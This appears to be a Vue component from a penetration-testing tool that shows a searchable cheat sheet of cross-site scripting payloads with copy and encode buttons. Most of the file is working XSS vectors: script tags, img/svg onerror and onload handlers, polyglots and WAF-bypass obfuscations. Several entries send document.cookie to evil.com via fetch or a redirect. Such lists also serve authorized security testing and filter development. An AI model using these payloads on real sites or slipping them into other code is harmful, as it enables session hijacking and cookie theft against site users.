<template>
  <div class="space-y-4">
    <TabView :tabs="categories">
      <template v-for="(cat, idx) in categories" :key="idx" #[`tab-${idx}`]>
        <div class="space-y-3">
          <div class="flex items-center gap-3">
            <input
              v-model="searchText"
              type="text"
              placeholder="搜索 payload..."
              class="flex-1 rounded-md border px-3 py-2 text-sm focus:outline-none"
              style="background-color: var(--color-bg-secondary); border-color: var(--color-border); color: var(--color-text);"
            />
            <span class="text-xs" style="color: var(--color-text-muted); white-space: nowrap;">
              {{ filteredPayloads(cat).length }} 个
            </span>
          </div>

          <div class="space-y-2">
            <div
              v-for="(payload, pidx) in filteredPayloads(cat)"
              :key="pidx"
              class="rounded-md border p-3"
              style="border-color: var(--color-border); background-color: var(--color-bg-secondary);"
            >
              <div class="flex items-start justify-between gap-2 mb-1">
                <code class="text-sm font-mono break-all" style="color: var(--color-text);">{{ payload.code }}</code>
                <CopyButton :text="payload.code" />
              </div>
              <p v-if="payload.desc" class="text-xs" style="color: var(--color-text-muted);">{{ payload.desc }}</p>

              <!-- Encode options -->
              <div class="flex flex-wrap items-center gap-1.5 mt-2 pt-2 border-t" style="border-color: var(--color-border);">
                <span class="text-xs" style="color: var(--color-text-muted);">编码:</span>
                <button
                  @click="showEncoded(payload.code, 'html')"
                  class="text-xs px-1.5 py-0.5 rounded border"
                  style="color: var(--color-text-muted); border-color: var(--color-border);"
                >HTML实体</button>
                <button
                  @click="showEncoded(payload.code, 'url')"
                  class="text-xs px-1.5 py-0.5 rounded border"
                  style="color: var(--color-text-muted); border-color: var(--color-border);"
                >URL编码</button>
                <button
                  @click="showEncoded(payload.code, 'base64')"
                  class="text-xs px-1.5 py-0.5 rounded border"
                  style="color: var(--color-text-muted); border-color: var(--color-border);"
                >Base64</button>
              </div>

              <div v-if="encodedResult" class="mt-2 flex items-center gap-2">
                <code class="flex-1 text-xs font-mono break-all p-1.5 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text);">{{ encodedResult }}</code>
                <CopyButton :text="encodedResult" />
              </div>
            </div>
          </div>

          <div v-if="filteredPayloads(cat).length === 0 && searchText" class="text-center py-4">
            <p class="text-xs" style="color: var(--color-text-muted);">没有匹配的 payload</p>
          </div>
        </div>
      </template>
    </TabView>
  </div>
</template>

<script setup lang="ts">
import { ref } from 'vue';
import TabView from '../../common/TabView.vue';
import CopyButton from '../../common/CopyButton.vue';

interface Payload { code: string; desc: string; }

const searchText = ref('');
const encodedResult = ref('');

// Avoid literal closing tags in strings — they break Vue SFC parser
const O = '<' + 'script>';
const S = '<' + '/script>';
const T = '<' + '/textarea>';
const Ti = '<' + '/title>';

function showEncoded(code: string, type: string) {
  switch (type) {
    case 'html':
      encodedResult.value = code.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
      break;
    case 'url':
      encodedResult.value = encodeURIComponent(code);
      break;
    case 'base64':
      try {
        encodedResult.value = btoa(unescape(encodeURIComponent(code)));
      } catch {
        encodedResult.value = btoa(code);
      }
      break;
  }
}

const categories = ['基础', 'Img', 'SVG', '事件', 'Polyglot', 'WAF绕过'];

const payloads: Record<string, Payload[]> = {
  '基础': [
    { code: O + 'alert(1)' + S, desc: '基础 script 标签注入' },
    { code: O + 'alert(document.cookie)' + S, desc: '窃取 cookie' },
    { code: O + 'document.location="http://evil.com/?c="+document.cookie' + S, desc: '重定向并发送 cookie' },
    { code: O + 'fetch("http://evil.com/steal?c="+document.cookie)' + S, desc: '使用 fetch 发送 cookie' },
    { code: '"' + S + O + 'alert(1)' + S, desc: '闭合 script 标签再注入' },
    { code: T + O + 'alert(1)' + S, desc: '闭合 textarea 标签' },
    { code: Ti + O + 'alert(1)' + S, desc: '闭合 title 标签' },
    { code: O + 'eval(String.fromCharCode(97,108,101,114,116,40,49,41))' + S, desc: '使用 String.fromCharCode 绕过简单过滤' },
  ],
  'Img': [
    { code: '<img src=x onerror=alert(1)>', desc: 'img onerror 事件' },
    { code: '<img src="x" onerror="alert(1)">', desc: 'img onerror 带引号' },
    { code: '<img src=1 onerror=alert(1)>', desc: 'img onerror 有效 src' },
    { code: '<img src=x onerror=alert(document.cookie)>', desc: 'img onerror 获取 cookie' },
    { code: '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">', desc: 'img onerror + fetch' },
    { code: '<img/onerror=alert(1) src=x>', desc: 'img 不同属性顺序' },
    { code: '<IMG SRC=x ONERROR=alert(1)>', desc: '大写绕过' },
    { code: '<img src=x onerror=alert&#40;1&#41;>', desc: 'HTML实体编码' },
  ],
  'SVG': [
    { code: '<svg onload=alert(1)>', desc: 'svg onload 事件' },
    { code: '<svg>' + O + 'alert(1)' + S + '</svg>', desc: 'svg 内嵌 script' },
    { code: '<svg/onload=alert(1)>', desc: 'svg 自闭合' },
    { code: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', desc: 'svg animate onbegin' },
    { code: '<svg><set onbegin=alert(1) attributeName=x>', desc: 'svg set onbegin' },
    { code: '<svg><a><animate attributeName=href values=javascript:alert(1)>', desc: 'svg animate href 修改' },
    { code: '<svg><use href="data:image/svg+xml,&lt;svg onload=alert(1)&gt;">', desc: 'svg use data URI' },
    { code: '<math><mtext><table><mglyph><style><!--<' + '/style><img src=x onerror=alert(1)>', desc: 'math/mglyph 绕过' },
  ],
  '事件': [
    { code: '<body onload=alert(1)>', desc: 'body onload 事件' },
    { code: '<input onfocus=alert(1) autofocus>', desc: 'input onfocus autofocus' },
    { code: '<select onfocus=alert(1) autofocus>', desc: 'select onfocus autofocus' },
    { code: '<textarea onfocus=alert(1) autofocus>', desc: 'textarea onfocus autofocus' },
    { code: '<details open ontoggle=alert(1)>', desc: 'details ontoggle' },
    { code: '<video><source onerror=alert(1)>', desc: 'video source onerror' },
    { code: '<audio src=x onerror=alert(1)>', desc: 'audio onerror' },
    { code: '<marquee onstart=alert(1)>', desc: 'marquee onstart' },
    { code: '<div onmouseover=alert(1)>', desc: 'div onmouseover' },
    { code: '<keygen onfocus=alert(1) autofocus>', desc: 'keygen onfocus (已弃用但部分旧浏览器支持)' },
    { code: '<object data="javascript:alert(1)">', desc: 'object javascript URI' },
    { code: '<embed src="javascript:alert(1)">', desc: 'embed javascript URI' },
  ],
  'Polyglot': [
    { code: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//<' + '/stYle/<' + '/titLe/<' + '/teXtarEa/<' + '/scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e', desc: '经典 polyglot payload' },
    { code: 'javascript:"/*\'/*`/*--></noscript>' + '<' + '/title>' + '<' + '/textarea>' + '<' + '/style>' + '<' + '/template>' + '<' + '/noembed>' + S + '<html onmouseover="/*&lt;svg onload=alert(1)&gt;*/">', desc: '多上下文 polyglot' },
    { code: '*/alert(1)' + S + O + '/*', desc: 'JS 注释绕过' },
    { code: '\';alert(1);//', desc: 'JS 字符串 + 单引号闭合' },
    { code: '";alert(1);//', desc: 'JS 字符串 + 双引号闭合' },
  ],
  'WAF绕过': [
    { code: '<scr' + O + 'ipt>alert(1)<' + '/scr' + S + 'ipt>', desc: '嵌套标签绕过' },
    { code: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">', desc: 'HTML 实体编码 onerror 内的内容' },
    { code: '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', desc: 'Base64 编码 payload' },
    { code: '<img src=x onerror=top["al"+"ert"](1)>', desc: '字符串拼接调用函数' },
    { code: '<img src=x onerror=window["\\x61lert"](1)>', desc: '\\x 十六进制转义' },
    { code: '<img src=x onerror=self[String.fromCharCode(97,108,101,114,116)](1)>', desc: 'String.fromCharCode 构造函数名' },
    { code: '<img src=x onerror=alert.call(null,1)>', desc: 'Function.call 调用' },
    { code: '<img src=x onerror=alert.apply(null,[1])>', desc: 'Function.apply 调用' },
    { code: '<img src=x onerror=setTimeout("ale"+"rt(1)",0)>', desc: 'setTimeout 间接执行' },
    { code: '<img src=x onerror="\\150\\141\\155\\154\\145\\162\\164(1)">', desc: '八进制转义' },
    { code: '%3Cscript%3Ealert(1)%3C/' + 'script%3E', desc: 'URL 编码整个标签' },
    { code: '<img src=x onerror=confirm(1)>', desc: '使用 confirm 代替 alert' },
  ],
};

function filteredPayloads(category: string): Payload[] {
  const list = payloads[category] || [];
  if (!searchText.value.trim()) return list;
  const q = searchText.value.toLowerCase();
  return list.filter(p => p.code.toLowerCase().includes(q) || p.desc.toLowerCase().includes(q));
}
</script>
